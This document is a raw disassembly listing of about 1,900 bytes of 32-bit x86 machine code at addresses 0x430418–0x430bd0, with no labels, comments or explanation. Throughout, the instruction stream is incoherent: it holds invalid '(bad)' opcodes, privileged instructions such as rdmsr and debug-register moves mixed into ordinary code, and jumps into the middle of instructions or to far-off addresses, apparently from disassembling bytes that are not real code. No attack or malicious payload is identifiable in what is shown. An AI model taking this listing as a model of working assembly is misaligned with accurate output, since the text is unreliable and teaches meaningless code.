  430418:	add    al,al
  43041a:	push   eax
  43041b:	es inc ebp
  43041d:	inc    ebp
  43041e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430424:	dec    DWORD PTR [ebx-0x3ff70301]
  43042a:	mov    DWORD PTR gs:[eax],eax
  43042d:	call   0x8c134967
  430432:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430439:	sub    eax,ebx
  43043b:	add    BYTE PTR [eax],al
  43043d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430443:	inc    ebp
  430444:	push   ebp
  430445:	mov    ebp,eax
  430447:	shr    BYTE PTR [ecx],1
  430449:	ret    
  43044a:	add    dh,al
  43044c:	mov    eax,ecx
  43044e:	cld    
  43044f:	test   BYTE PTR [eax+0x101],al
  430455:	inc    ebp
  430456:	xor    BYTE PTR [ebx],dh
  430458:	push   edi
  430459:	mov    ecx,0xffe48d89
  43045e:	inc    ebp
  43045f:	enter  0x4d8b,0xfc
  430463:	mov    eax,ebx
  430465:	or     BYTE PTR [ebx+0x38732c1],bl
  43046b:	add    DWORD PTR [ebp-0xbac000],ecx
  430471:	add    al,ch
  430473:	add    BYTE PTR [ecx],ch
  430475:	inc    DWORD PTR [eax]
  430477:	cld    
  430478:	mov    edi,DWORD PTR [ebp-0xc]
  43047b:	mov    esi,DWORD PTR [ebp-0x4]
  43047e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430484:	and    BYTE PTR [ebp+0x50e800ff],bl
  43048a:	sub    DWORD PTR [ebp+0x0],eax
  43048d:	mov    edi,edi
  43048f:	test   al,0xe4
  430491:	add    BYTE PTR [ebp-0x1],cl
  430494:	xor    ebp,eax
  430496:	add    esp,DWORD PTR [esi]
  430498:	cmp    eax,DWORD PTR [eax]
  43049a:	jne    0x4304e9
  43049c:	(bad)  
  43049d:	mov    ebx,eax
  43049f:	pushf  
  4304a0:	add    BYTE PTR [eax],al
  4304a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4304a8:	or     BYTE PTR [eax+0x8401c3],bh
  4304ae:	fwait
  4304af:	jne    0x4304e3
  4304b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4304b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4304bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4304c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4304ca:	add    BYTE PTR [edi+0x45],dl
  4304cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4304d4:	gs test ebp,ecx
  4304d7:	je     0x430504
  4304d9:	mov    eax,DWORD PTR [ebx]
  4304db:	cld    
  4304dc:	sar    BYTE PTR [eax+0x3b0145],1
  4304e2:	pcmpeqw mm4,mm2
  4304e5:	xor    edi,edi
  4304e7:	lea    ecx,[ebx-0x23927470]
  4304ed:	add    BYTE PTR [ebp+0x50],cl
  4304f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4304f3:	mov    ebp,DWORD PTR [eax-0x68]
  4304f6:	test   DWORD PTR [eax],eax
  4304f8:	clc    
  4304f9:	push   DWORD PTR [ebp-0x1]
  4304fc:	lea    ecx,[eax]
  4304fe:	int3   
  4304ff:	inc    ebp
  430500:	call   0xfb3690
  430505:	jne    0x4304ff
  430507:	xor    edi,DWORD PTR [ebp-0x41]
  43050a:	jmp    0x43057e
  43050c:	mov    eax,DWORD PTR [eax]
  43050e:	mov    eax,0x339545c7
  430513:	inc    DWORD PTR [ebx]
  430515:	push   DWORD PTR [ecx]
  430517:	inc    ecx
  430518:	mov    eax,DWORD PTR [eax]
  43051a:	jmp    0x43056c
  43051c:	mov    eax,DWORD PTR [ebp-0x3c]
  43051f:	mov    eax,eax
  430521:	cld    
  430522:	clc    
  430523:	ret    
  430524:	test   bh,al
  430526:	pop    es
  430527:	xchg   ebp,eax
  430528:	add    bh,bh
  43052a:	inc    ebp
  43052b:	dec    DWORD PTR [edi]
  43052d:	sub    ebp,DWORD PTR [ebx]
  43052f:	add    BYTE PTR [eax],al
  430531:	push   eax
  430532:	jbe    0x430589
  430534:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43053a:	or     al,0xcf
  43053c:	inc    eax
  43053d:	enter  0x745,0x72
  430541:	inc    ebp
  430542:	mov    eax,DWORD PTR [ecx]
  430544:	int3   
  430545:	add    BYTE PTR [ebp-0x75],al
  430548:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43054e:	ror    BYTE PTR [ebp+0x72f80885],1
  430554:	inc    ebp
  430555:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43055b:	fadd   st,st(6)
  43055d:	rol    BYTE PTR [ebp+0x12],0x8b
  430561:	inc    ebp
  430562:	fmul   QWORD PTR [ebx-0x3c39233d]
  430568:	inc    ebp
  430569:	test   bh,al
  43056b:	fwait
  43056c:	clc    
  43056d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430573:	inc    ebp
  430574:	xor    esi,DWORD PTR [ebx]
  430576:	pushf  
  430577:	mov    ecx,0xffb48dc7
  43057c:	test   eax,ecx
  43057e:	clc    
  43057f:	dec    ebp
  430580:	inc    ebp
  430581:	mov    edi,DWORD PTR ds:0xc7c19c08
  430587:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43058e:	inc    ebp
  43058f:	inc    ebp
  430590:	aas    
  430591:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430598:	test   DWORD PTR [ecx],esi
  43059a:	clc    
  43059b:	pushf  
  43059c:	inc    ebp
  43059d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4305a3:	push   eax
  4305a4:	mov    BYTE PTR [edx],0x7d
  4305a7:	add    BYTE PTR [ebx],bh
  4305a9:	mov    ecx,DWORD PTR [edi]
  4305ab:	mov    DWORD PTR [eax],ebx
  4305ad:	les    eax,FWORD PTR [eax]
  4305af:	adc    ebp,ecx
  4305b1:	dec    ebp
  4305b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4305b8:	mov    ecx,esi
  4305ba:	lock or al,cl
  4305bd:	clc    
  4305be:	inc    ebp
  4305bf:	add    esi,DWORD PTR [ebx]
  4305c1:	jge    0x4305c6
  4305c3:	xor    edi,DWORD PTR [ebx]
  4305c5:	cmp    ecx,DWORD PTR [edi]
  4305c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4305cc:	mov    edi,DWORD PTR [ecx]
  4305ce:	test   al,0xcc
  4305d0:	dec    ebp
  4305d1:	test   BYTE PTR [ebx],dh
  4305d3:	pop    es
  4305d4:	xor    eax,DWORD PTR [eax]
  4305d6:	add    ecx,DWORD PTR [esi]
  4305d8:	add    ecx,eax
  4305da:	psraw  mm0,mm1
  4305dd:	sub    BYTE PTR [ebp+0x38],cl
  4305e0:	mov    edi,DWORD PTR [ebx]
  4305e2:	lock int3 
  4305e4:	shl    edx,1
  4305e6:	rol    BYTE PTR [ebp+0xc],1
  4305e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4305f0:	jmp    0x75063a
  4305f5:	pushf  
  4305f6:	inc    ebp
  4305f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4305fd:	xor    ecx,ebx
  4305ff:	add    ecx,esi
  430601:	mov    esi,eax
  430603:	enter  0x45af,0x8b
  430607:	xor    ecx,eax
  430609:	add    edx,DWORD PTR [ebp-0x77]
  43060c:	sub    ecx,DWORD PTR [eax]
  43060e:	cmp    eax,DWORD PTR [ebp+0x77]
  430611:	ror    DWORD PTR [ebx-0x76385764],1
  430617:	test   al,0x0
  430619:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43061f:	cmp    al,0x33
  430621:	pushf  
  430622:	xor    eax,edi
  430624:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43062b:	inc    ebp
  43062c:	dec    ebp
  43062d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430635:	test   DWORD PTR ds:0xeb4545f8,eax
  43063b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430641:	fdiv   QWORD PTR [ebx]
  430643:	dec    ebp
  430644:	xor    esi,DWORD PTR [ebx]
  430646:	add    eax,DWORD PTR [ebx]
  430648:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43064e:	dec    ebp
  43064f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430655:	out    dx,eax
  430656:	rol    BYTE PTR [eax],1
  430658:	add    eax,0xebc8458b
  43065d:	dec    ebp
  43065e:	mov    ebp,DWORD PTR [ebx]
  430660:	mov    esp,0x33f84d8b
  430665:	ret    
  430666:	xor    eax,esi
  430668:	add    ecx,eax
  43066a:	add    eax,DWORD PTR [edx+0xc1010f]
  430670:	dec    ebp
  430671:	inc    ebp
  430672:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430678:	ror    bl,1
  43067a:	add    eax,0xebc645ce
  43067f:	scas   eax,DWORD PTR es:[edi]
  430680:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430686:	xor    ebp,DWORD PTR [ebx]
  430688:	xor    edi,DWORD PTR [ebx]
  43068a:	add    esi,DWORD PTR [edi+0x3]
  43068d:	mov    ecx,DWORD PTR [edi]
  43068f:	clc    
  430690:	rol    ebx,0x4d
  430693:	(bad)  
  430694:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43069b:	mov    ah,0x45
  43069d:	dec    ebp
  43069e:	jbe    0x4306d3
  4306a0:	mov    esi,DWORD PTR [ebx]
  4306a2:	call   0x334653aa
  4306a7:	rdpmc  
  4306a9:	rol    DWORD PTR [ebx],0x4d
  4306ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4306b2:	inc    ebp
  4306b3:	ror    BYTE PTR [ebx+0x45450808],1
  4306b9:	jmp    0x10b0749
  4306be:	inc    ebp
  4306bf:	inc    ebp
  4306c0:	(bad)  
  4306c1:	mov    ebx,eax
  4306c3:	clc    
  4306c4:	test   ebx,eax
  4306c6:	clc    
  4306c7:	retf   
  4306c8:	inc    ebp
  4306c9:	into   
  4306ca:	mov    esi,0x8b85afec
  4306d0:	clc    
  4306d1:	enter  0x5545,0x33
  4306d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4306dc:	ret    
  4306dd:	mov    ah,0xc6
  4306df:	addr16 push 0x338b4545
  4306e5:	clc    
  4306e6:	add    eax,ebx
  4306e8:	loopne 0x4306b5
  4306ea:	dec    ebp
  4306eb:	into   
  4306ec:	mov    al,dh
  4306ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4306f4:	inc    ebp
  4306f5:	push   ebp
  4306f6:	mov    ebp,DWORD PTR [ebx]
  4306f8:	in     al,dx
  4306f9:	cmp    eax,ebx
  4306fb:	ja     0x430742
  4306fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430703:	inc    ebp
  430704:	fwait
  430705:	mov    esi,DWORD PTR [edx]
  430707:	clc    
  430708:	mov    bl,al
  43070a:	xlat   BYTE PTR ds:[ebx]
  43070b:	retf   
  43070c:	inc    ebp
  43070d:	into   
  43070e:	mov    eax,esi
  430710:	in     al,dx
  430711:	scas   eax,DWORD PTR es:[edi]
  430712:	retf   
  430713:	mov    ecx,DWORD PTR [ebp-0x38]
  430716:	mov    edx,DWORD PTR [ebp-0x24]
  430719:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430720:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430727:	mov    eax,DWORD PTR [ebx]
  430729:	clc    
  43072a:	loopne 0x4306ef
  43072c:	push   ebp
  43072d:	retf   
  43072e:	mov    dh,al
  430730:	adc    esi,ecx
  430732:	jb     0x4306e3
  430734:	add    BYTE PTR [ebx+0x558bc845],cl
  43073a:	in     al,dx
  43073b:	sub    eax,ebx
  43073d:	cmp    ecx,ebx
  43073f:	mov    eax,esi
  430741:	mov    esp,0x45af03ce
  430746:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43074c:	mov    eax,ebx
  43074e:	in     al,dx
  43074f:	into   
  430750:	dec    ebp
  430751:	(bad)  
  430752:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430758:	rol    DWORD PTR [ebp+0x4d],0x89
  43075c:	xor    esp,esp
  43075e:	sub    eax,DWORD PTR [ebp-0x75]
  430761:	add    ebp,esp
  430763:	mov    al,0x55
  430765:	inc    ebp
  430766:	xor    esi,DWORD PTR [ecx]
  430768:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43076f:	inc    ebp
  430770:	xor    esi,DWORD PTR [edx]
  430772:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430779:	test   DWORD PTR [eax],eax
  43077b:	clc    
  43077c:	enter  0x8645,0x33
  430780:	inc    DWORD PTR [ebx]
  430782:	(bad)  
  430783:	jmp    0x4307ca
  430785:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43078b:	inc    ebp
  43078c:	(bad)  
  43078d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430793:	fwait
  430794:	retf   
  430795:	xor    al,cl
  430797:	mov    BYTE PTR [ebp+0xb],cl
  43079a:	lea    eax,[ebp+0x8]
  43079d:	xor    esi,DWORD PTR [edx+0x3]
  4307a0:	add    al,ah
  4307a2:	inc    ebp
  4307a3:	dec    ebp
  4307a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4307aa:	gs add ch,cl
  4307ad:	inc    ebp
  4307ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4307b4:	inc    ebp
  4307b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4307bb:	push   ebp
  4307bc:	(bad)  
  4307bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4307c3:	add    ch,ch
  4307c5:	inc    ebp
  4307c6:	dec    DWORD PTR [ebx-0x34332775]
  4307cc:	add    al,0x4d
  4307ce:	inc    ebp
  4307cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4307d5:	fwait
  4307d6:	add    DWORD PTR [edx],esi
  4307d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4307de:	push   DWORD PTR [ebx]
  4307e0:	int3   
  4307e1:	xor    eax,DWORD PTR [eax]
  4307e3:	add    edx,DWORD PTR [eax+0x3]
  4307e6:	mov    DWORD PTR [edi],ecx
  4307e8:	call   0x4288c8ae
  4307ed:	mov    DWORD PTR [ebp-0x20],esp
  4307f0:	add    BYTE PTR [ebp+0x7d],al
  4307f3:	mov    eax,DWORD PTR [eax]
  4307f5:	in     al,0x15
  4307f7:	ret    
  4307f8:	iret   
  4307f9:	(bad)  
  4307fa:	enter  0x14af,0x8b
  4307fe:	(bad)  
  4307ff:	in     al,dx
  430800:	or     bl,cl
  430802:	adc    cl,al
  430804:	push   ebp
  430805:	dec    ebp
  430806:	inc    eax
  430807:	mov    edx,DWORD PTR [ebp-0x20]
  43080a:	jb     0x4307d7
  43080c:	mov    ecx,esi
  43080e:	cld    
  43080f:	scas   eax,DWORD PTR es:[edi]
  430810:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430817:	mov    BYTE PTR [eax],0x8c
  43081a:	push   0xffffff9b
  43081c:	push   edi
  43081d:	xor    dl,BYTE PTR [eax+0x3b]
  430820:	mov    ecx,DWORD PTR [edi]
  430822:	call   0x8c424d85
  430827:	mov    eax,eax
  430829:	in     al,dx
  43082a:	jge    0x430879
  43082c:	mov    DWORD PTR [ebx],esi
  43082e:	int3   
  43082f:	add    eax,DWORD PTR [ebp+0xf]
  430832:	xor    eax,ecx
  430834:	(bad)  
  430835:	dec    ebp
  430836:	pushf  
  430837:	xor    ecx,esi
  430839:	add    edi,DWORD PTR [edi]
  43083b:	mov    eax,DWORD PTR [ebp-0x38]
  43083e:	(bad)  
  43083f:	test   dh,dl
  430841:	fwait
  430842:	add    esi,DWORD PTR [edx]
  430844:	jmp    0x4307cf
  430846:	mov    cl,al
  430848:	add    eax,0x14330f45
  43084d:	mov    ecx,0xff468d80
  430852:	jmp    0xc990181f
  430857:	mov    edx,ecx
  430859:	rol    BYTE PTR [ebp+0x330155],1
  43085f:	add    ecx,DWORD PTR [ebp+0xf]
  430862:	xor    eax,edx
  430864:	(bad)  
  430865:	ror    DWORD PTR [eax],0x86
  430868:	jb     0x430867
  43086a:	add    bh,bh
  43086c:	clc    
  43086d:	inc    ebp
  43086e:	jb     0x4308da
  430870:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430876:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43087c:	shr    BYTE PTR [eax-0x3d],0x30
  430880:	clc    
  430881:	add    BYTE PTR [ebp+0x75],al
  430884:	xor    DWORD PTR [edx-0x64],ebp
  430887:	inc    edi
  430889:	adc    al,0xe8
  43088b:	inc    ebp
  43088c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430892:	mov    ecx,DWORD PTR [eax]
  430894:	cld    
  430895:	or     DWORD PTR [ebp-0x34],0x33
  430899:	jbe    0x43089e
  43089b:	mov    edx,DWORD PTR [ecx+0x2b]
  43089e:	dec    ebp
  43089f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4308a5:	mov    BYTE PTR [ebx],dh
  4308a7:	mov    eax,DWORD PTR [ebx]
  4308a9:	or     BYTE PTR [ecx+0x3b],dl
  4308ac:	dec    ebp
  4308ad:	int3   
  4308ae:	xor    ebp,edi
  4308b0:	add    eax,DWORD PTR [ebp+0x51]
  4308b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4308b6:	xor    eax,DWORD PTR [eax]
  4308b8:	add    ebp,DWORD PTR [eax+0x51]
  4308bb:	adc    BYTE PTR [eax+0x0],0x8b
  4308bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4308c5:	inc    ebp
  4308c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4308cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4308d2:	dec    ebp
  4308d3:	mov    esi,DWORD PTR [ebx]
  4308d5:	hlt    
  4308d6:	add    eax,ebx
  4308d8:	push   ecx
  4308d9:	inc    ebp
  4308da:	dec    ebp
  4308db:	(bad)  
  4308dc:	call   esi
  4308de:	in     al,0xc7
  4308e0:	retf   
  4308e1:	mov    al,ds:0xc5ff3dce
  4308e6:	adc    al,0xc6
  4308e8:	inc    ebp
  4308e9:	and    eax,0x9c0f4c85
  4308ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4308f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4308f9:	mov    dh,0xc7
  4308fb:	cmp    eax,eax
  4308fd:	jne    0x45440149
  430903:	mov    esi,DWORD PTR [ebx]
  430905:	mov    eax,0x848bcb9c
  43090a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430911:	or     BYTE PTR [edi],cl
  430913:	(bad)  
  430914:	dec    ebp
  430915:	inc    edi
  430916:	add    bh,0x54
  430919:	or     cl,ch
  43091b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430921:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430928:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43092e:	(bad)  
  43092f:	cmp    eax,0x89839cff
  430934:	je     0x43091a
  430936:	inc    DWORD PTR [ebp+0x0]
  430939:	mov    ecx,DWORD PTR [ebp-0x340018]
  43093f:	into   
  430940:	dec    DWORD PTR [ebx-0x7f72431c]
  430946:	push   0x5000ff01
  43094b:	retf   
  43094c:	inc    ebp
  43094d:	into   
  43094e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430954:	push   eax
  430955:	into   
  430956:	call   0x4b0de6
  43095b:	retf   
  43095c:	add    dh,cl
  43095e:	add    bh,bh
  430960:	mov    DWORD PTR [eax+ecx*1],edx
  430963:	clc    
  430964:	inc    ebp
  430965:	inc    ebp
  430966:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43096c:	push   0x1
  43096e:	push   edi
  43096f:	add    BYTE PTR [eax-0x35],dl
  430972:	mov    ecx,esi
  430974:	cld    
  430975:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43097b:	into   
  43097c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430983:	xor    eax,DWORD PTR [ebp+0x3]
  430986:	jne    0x4309d9
  430988:	call   DWORD PTR [eax-0x3c]
  43098b:	mov    DWORD PTR [ecx-0x18],edx
  43098e:	mov    edi,edi
  430990:	call   0x8b464f19
  430995:	add    ah,ah
  430997:	rol    BYTE PTR [ebp-0x7c],0xeb
  43099b:	add    edi,edi
  43099d:	add    al,ch
  43099f:	inc    ebp
  4309a0:	push   ecx
  4309a1:	cmp    al,0x8b
  4309a3:	pushf  
  4309a4:	(bad)  
  4309a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4309ac:	test   DWORD PTR [ebp-0x8],ecx
  4309af:	add    BYTE PTR [ebp+0x54],0x32
  4309b3:	jmp    0x8bcc9254
  4309b8:	in     al,dx
  4309b9:	or     BYTE PTR [ebp-0xf],al
  4309bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4309c2:	hlt    
  4309c3:	mov    eax,DWORD PTR [ebp-0x50]
  4309c6:	xor    esi,ecx
  4309c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4309ce:	inc    ebp
  4309cf:	adc    ecx,0x68
  4309d2:	pushf  
  4309d3:	inc    edi
  4309d5:	add    al,ch
  4309d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309d8:	test   edi,edi
  4309da:	clc    
  4309db:	inc    DWORD PTR [ebp-0x73]
  4309de:	cmp    al,0x74
  4309e0:	pushf  
  4309e1:	inc    edi
  4309e3:	push   ecx
  4309e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309e5:	jne    0x43096c
  4309e7:	push   eax
  4309e8:	clc    
  4309e9:	test   DWORD PTR [ebp-0x1],eax
  4309ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4309f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4309fa:	cmp    BYTE PTR [edx],bl
  4309fc:	pushf  
  4309fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430a03:	add    BYTE PTR [ebx],dh
  430a05:	inc    ebp
  430a06:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430a0c:	enter  0x8401,0x0
  430a10:	add    al,BYTE PTR [eax]
  430a12:	add    bh,bh
  430a14:	out    dx,eax
  430a15:	sbb    BYTE PTR [eax],al
  430a17:	dec    ebp
  430a18:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  430a1e:	sub    esi,DWORD PTR [ebx]
  430a20:	mov    ebp,DWORD PTR [eax-0x8]
  430a23:	add    bl,0x0
  430a26:	(bad)  
  430a27:	cmp    eax,ecx
  430a29:	or     BYTE PTR [edx+0x750114],al
  430a2f:	inc    DWORD PTR [ebp+0x18]
  430a32:	mov    eax,DWORD PTR [ebp-0x8]
  430a35:	mov    ebx,eax
  430a37:	(bad)  
  430a38:	retf   
  430a39:	inc    ebp
  430a3a:	into   
  430a3b:	mov    esi,eax
  430a3d:	int3   
  430a3e:	scas   eax,DWORD PTR es:[edi]
  430a3f:	push   es
  430a40:	mov    esi,DWORD PTR [ebp-0xc]
  430a43:	call   DWORD PTR [ebp+0x18]
  430a46:	sub    edi,DWORD PTR [ebp+0x3b]
  430a49:	mov    esi,DWORD PTR [edi-0x34]
  430a4c:	mov    eax,DWORD PTR [ebp-0x8]
  430a4f:	xor    ebx,eax
  430a51:	pushf  
  430a52:	mov    bh,0xbc
  430a55:	fadd   QWORD PTR [eax]
  430a57:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  430a5d:	mov    esi,DWORD PTR [ebx]
  430a5f:	in     al,0x33
  430a61:	ret    
  430a62:	add    eax,esi
  430a64:	add    eax,DWORD PTR [ebp+0xf]
  430a67:	mov    eax,ecx
  430a69:	in     al,0x4d
  430a6b:	ret    
  430a6c:	mov    eax,esi
  430a6e:	in     al,dx
  430a6f:	inc    ebp
  430a70:	rol    edi,1
  430a72:	sar    al,1
  430a74:	or     BYTE PTR [ebp+0x45e9f845],al
  430a7a:	add    BYTE PTR [ebx],dh
  430a7c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430a83:	test   ebx,eax
  430a85:	clc    
  430a86:	retf   
  430a87:	inc    ebp
  430a88:	into   
  430a89:	cmp    eax,0xc7af9cc6
  430a8e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430a95:	inc    ebp
  430a96:	cmp    edi,DWORD PTR [edi]
  430a98:	ja     0x430a36
  430a9a:	mov    eax,edi
  430a9c:	mov    esp,0x458567a8
  430aa1:	clc    
  430aa2:	mov    eax,DWORD PTR [ebp-0x8]
  430aa5:	mov    eax,ebx
  430aa7:	in     al,dx
  430aa8:	retf   
  430aa9:	ret    
  430aaa:	into   
  430aab:	mov    dh,0x7d
  430aae:	scas   eax,DWORD PTR es:[edi]
  430aaf:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430ab5:	add    BYTE PTR [ebx],ch
  430ab7:	jmp    0xba0bf7
  430abc:	mov    eax,DWORD PTR [ebp-0x5c]
  430abf:	mov    eax,DWORD PTR [ebp-0x14]
  430ac2:	inc    ebp
  430ac3:	enter  0x458b,0xf8
  430ac7:	xor    eax,ebx
  430ac9:	add    ecx,ebx
  430acb:	cmp    ecx,esi
  430acd:	shufps xmm7,xmm4,0xaf
  430ad1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430ad7:	dec    ebp
  430ad8:	sub    esi,DWORD PTR [ebx]
  430ada:	cmp    esi,DWORD PTR [ebx]
  430adc:	ja     0x430ae1
  430ade:	mov    eax,DWORD PTR [ebx]
  430ae0:	lods   al,BYTE PTR ds:[esi]
  430ae1:	mov    db0,ecx
  430ae4:	inc    ebp
  430ae5:	dec    ebp
  430ae6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430aec:	retf   
  430aed:	rol    dh,1
  430aef:	or     al,0xce
  430af1:	inc    ebp
  430af2:	scas   eax,DWORD PTR es:[edi]
  430af3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430af9:	add    BYTE PTR [ebx],ch
  430afb:	add    BYTE PTR [ebx],bh
  430afd:	inc    ebp
  430afe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430b04:	inc    ebp
  430b05:	retf   
  430b06:	mov    ecx,esi
  430b08:	clc    
  430b09:	(bad)  
  430b0a:	retf   
  430b0b:	scas   eax,DWORD PTR es:[edi]
  430b0c:	ret    
  430b0d:	mov    ecx,esi
  430b0f:	hlt    
  430b10:	(bad)  
  430b11:	push   ebp
  430b12:	scas   eax,DWORD PTR es:[edi]
  430b13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430b19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430b1f:	add    BYTE PTR [ebx],al
  430b21:	mov    eax,eax
  430b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b24:	inc    ebp
  430b25:	dec    ebp
  430b26:	xor    DWORD PTR [ebx],esi
  430b28:	pushf  
  430b29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430b2f:	rdmsr  
  430b31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430b39:	sar    eax,1
  430b3b:	rol    BYTE PTR [ebp+0x5],1
  430b3e:	xor    eax,DWORD PTR [ebp+0x3]
  430b41:	jmp    0x430b2e
  430b43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430b49:	xor    eax,DWORD PTR [ebp+0x33]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	rol    BYTE PTR [ebx],1
  430b50:	test   BYTE PTR [edi],cl
  430b52:	fwait
  430b53:	shl    DWORD PTR [edx],0x4d
  430b56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430b5c:	xor    edx,eax
  430b5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430b64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430b6a:	add    BYTE PTR [ebx],dh
  430b6c:	inc    ebp
  430b6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430b73:	rdpmc  
  430b75:	rol    DWORD PTR [ebx],0x4d
  430b78:	loopne 0x430b05
  430b7a:	push   ebp
  430b7b:	in     al,dx
  430b7c:	mov    cl,dl
  430b7e:	adc    eax,edx
  430b80:	jb     0x430b87
  430b82:	add    BYTE PTR [ebp+0x45],al
  430b85:	jmp    0x430b12
  430b87:	mov    ebx,eax
  430b89:	test   al,0xcb
  430b8b:	dec    ebp
  430b8c:	dec    ebp
  430b8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430b93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430b99:	dec    ebp
  430b9a:	mov    al,0x8b
  430b9c:	dec    ebp
  430b9d:	in     al,dx
  430b9e:	xor    edx,ecx
  430ba0:	xor    edx,eax
  430ba2:	add    eax,DWORD PTR [ebp+0x3]
  430ba5:	jbe    0x430bb6
  430ba7:	mov    eax,ecx
  430ba9:	test   al,0x45
  430bab:	dec    ebp
  430bac:	mov    DWORD PTR [ebx],esi
  430bae:	loopne 0x430be3
  430bb0:	inc    ebp
  430bb1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430bb7:	rol    esi,0x45
  430bba:	scas   eax,DWORD PTR es:[edi]
  430bbb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430bc1:	mov    eax,ecx
  430bc3:	hlt    
  430bc4:	dec    ebp
  430bc5:	inc    ebp
  430bc6:	mov    eax,edi
  430bc8:	loopne 0x430ba2
  430bca:	retf   
  430bcb:	test   esi,ecx
  430bcd:	clc    
  430bce:	scas   eax,DWORD PTR es:[edi]
  430bcf:	inc    ebp
  430bd0:	mov    eax,edi
